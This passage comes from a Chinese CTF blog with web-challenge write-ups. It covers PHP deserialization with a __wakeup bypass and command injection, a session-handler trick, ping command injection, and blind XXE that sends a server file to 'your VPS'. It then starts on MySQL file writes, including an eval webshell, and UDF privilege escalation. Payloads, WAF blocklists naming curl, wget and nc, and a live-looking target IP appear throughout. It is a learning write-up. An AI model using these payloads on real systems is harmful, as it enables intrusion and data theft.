class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bag</span>=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;M24&quot;</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str=&quot;You got the airdrop&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bag=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;weapon=<span class="string">&quot;kar98K&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_air_drops</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$method</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$file</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;.//class<span class="subst">$file</span>[0].php&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;php  .//class//<span class="subst">$method</span>.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;php  .//class//win.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nothing</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;weapon===<span class="string">&#x27;AWM&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_air_drops</span>(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后本地构造一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bag</span>=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;AWM&quot;</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str=&quot;You got the airdrop&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        &#125;</span><br><span class="line"> <span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sheldon</span>();</span><br><span class="line"> <span class="variable">$temp</span>-&gt;bag = <span class="string">&quot;win.php &amp;&amp; cat waf.php &amp;&amp; index&quot;</span>;</span><br><span class="line"> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>)));</span><br></pre></td></tr></table></figure><p>然后记得把属性数量改一下绕__wakeup 本来是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A2%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>然后改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>访问一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.57.208:6001/?LandIn=school&amp;&amp;pubg=O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>得到waf.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//$black = [];</span></span><br><span class="line">    <span class="variable">$black</span> = <span class="keyword">array</span>(<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;comm&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;mv&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;tailf&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%0d&#x27;</span>,<span class="string">&#x27;%00&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;ps&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;ifconfig&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;curl&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;printf&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$values</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后用\绕过waf 比如用l\s绕过ls 然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6001/?LandIn=school&amp;&amp;pubg=O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A23%3A%22win.php+%26%26+l%5Cs+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class.php</span><br><span class="line">class.php.bak</span><br><span class="line">image</span><br><span class="line">index.php</span><br><span class="line">index.php.bak</span><br><span class="line">waf.php</span><br></pre></td></tr></table></figure><p>然后构造一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.php &amp;&amp; find  pw\d&amp;&amp; index</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./class</span><br><span class="line">./class/flag.php</span><br><span class="line">./class/win.php</span><br><span class="line">./image</span><br><span class="line">./image/PUBG.jpg</span><br><span class="line">./index.php.bak</span><br><span class="line">./waf.php</span><br><span class="line">./class.php</span><br><span class="line">./class.php.bak</span><br><span class="line">./index.php</span><br></pre></td></tr></table></figure><p>然后cat一下就ok</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.php &amp;&amp; cat ./class/flag.php&amp;&amp; index</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//moctf&#123;Try_Learn_PhP_h4rder&#125;</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="登录一哈">登录一哈</h3><p>首先.git泄漏,githack一波 index.php的主要代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:./index.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="string">&quot;moctf&#123;xxxxxxxxxxxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;flag == <span class="variable language_">$this</span>-&gt;name)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wow,this is flag:&quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里发现session的序列化处理和反序列化处理不同,所以可以利用一下,具体参考 <a href="http://www.jb51.net/article/107101.htm">http://www.jb51.net/article/107101.htm</a> 然后注意flag.php里面有个 $this-&gt;flag == $this-&gt;name 那么可以用引用绕过 <span class="math inline">\(this-&gt;name = &amp;\)</span>this-&gt;flag 然后序列化,代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MOCTF</span>();</span><br><span class="line"><span class="variable">$temp</span> -&gt; name = &amp;<span class="variable">$temp</span>-&gt;flag;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>));</span><br></pre></td></tr></table></figure><p>得到结果 <code>O:5:"MOCTF":2:&#123;s:4:"flag";N;s:4:"name";R:2;&#125;</code> 然后提交帐号为O:5:"MOCTF":2:{s:4:"flag";N;s:4:"name";R:2;} 密码随意,然后访问flag.php,拿到flag <code>Wow,this is flag:moctf&#123;ser1ali2e_h4ndler_1s_c00l&#125;</code></p><h3 id="ping一下好吗">ping一下好吗</h3><p>命令执行的题目,一道题学到了不少东西 首先ceye.io了解一下 注册一个号,然后里面有攻击的payload 不知道为什么大神的方法不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`lsbase64`.xxxx.ceye.io</span><br></pre></td></tr></table></figure><p>但是我就不行... 后来想了个办法,既然命令可以执行,那么我直接把得到的回显写到另外一个文件不就好了 所以我就</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`ls&gt;123.txt`.xxxx.ceye.io</span><br></pre></td></tr></table></figure><p>得到文件目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">123.txt</span><br><span class="line">apache2</span><br><span class="line">css</span><br><span class="line">exec.php</span><br><span class="line">fhnrwlnbjvf.php</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure><p>然后再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat fhnrwlnbjvf.php&gt;321.txt`.xxxx.ceye.io</span><br></pre></td></tr></table></figure><p>去访问一下321.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;moctf&#123;dfa10ff1bd9872cda1d408f07eb66394&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>本来打算用sed -n -p1来提取的,但是-被过滤了...很惨... 看完这道题还顺便理解了之前hctf的那道oob,不错不错 噢噢对了,把源码放一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$target</span>);</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;python&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bash&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;nc&#x27;</span> =&gt;<span class="string">&#x27;&#x27;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$target</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 1 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cmd</span> != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;exec success&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="更新">2.22更新</h4><h3 id="字符串处理">字符串处理</h3><p>这道题啊...真是惨到爆炸,题目提示的是application/xml,然后client-ip= localhost, 就很明显是xxe,但是我并不会,看了大佬的博客之后,自己试着写了一个blind xxe的payload 但是从来都没有成功过,所以这篇文章拖到现在还没发... 虽然现在题目已经关掉了,但是还是把payload给发一下吧,虽然这个payload是hgame里的payload,不过自己修改一下xml文件就ok(其实叫dtd更好一点),这里给出hgame的**书店那道题的解法</p><h4 id="测试版">测试版:</h4><p>首先服务器上放一个evil.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;1111&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://你的vps/xxe.php?f=%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><p>然后 xxe.php的文件内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./1.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后post的内容是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://你的vps/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>然后就可以在vps上收到数据,1.txt里面就是1111 如果把payload里的东西改成请求的话,那么就是把evil.xml改成</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///a/b&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://你的vps/xxe.php?f=%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><p>这里就可以读取到服务器上的a/b的文件并存到你vps上当前目录的1.txt下 然后就拿到flag: hgame{Xxe_v3ry_funny!!!!}</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql的补充学习</title>
      <link href="/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>以前关于mysql只会提数据,并不会处理文件和提权,这里整理一下学习到的新姿势</p><h3 id="load_file">load_file</h3><p>其实这个说起来是都知道,但是以前实验的时候总是失败.... 今天再次尝试,发现还是不行,load_file的时候总是返回null,如图 <img src="/images/2018/02/sql_1.png" alt="blacsheep" /> 然后试图写入文件的时候弹出了<img src="/images/2018/02/sql_2.png" alt="blacsheep" /> 然后百度了一番,改了一下mysql的设置 在mysql.ini最后加了一句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=</span><br></pre></td></tr></table></figure><p>然后就可以成功的读写文件了(本身mysql是root权限) <img src="/images/2018/02/sql_3.png" alt="blacsheep" /> 同样也可以写shell,比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into dumpfile &quot;D://123.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/02/sql_4.png" alt="blacsheep" /> okok,基础就到这里,下面是关于mysql的提权</p><h3 id="udf提权">udf提权</h3><p>首先udf的提权会涉及到mysql的版本问题,5.1以上和5.1一下是不一样的 而且提权的系统不一样操作也是不一样的.... 然后涉及到的dll或者so文件在sqlmap的udf文件夹里面都有 直接开始吧,首先看一下你的plugin路径 <img src="/images/2018/02/sql_5.png" alt="blacsheep" /> 本机是windows64位,所以用的win/64/xxxx.dll 把这个文件写入到plugin目录下,但是由于sql语句无法创建目录...很尴尬,然后网上有大神流传的方法:利用ntfs ads流创建目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 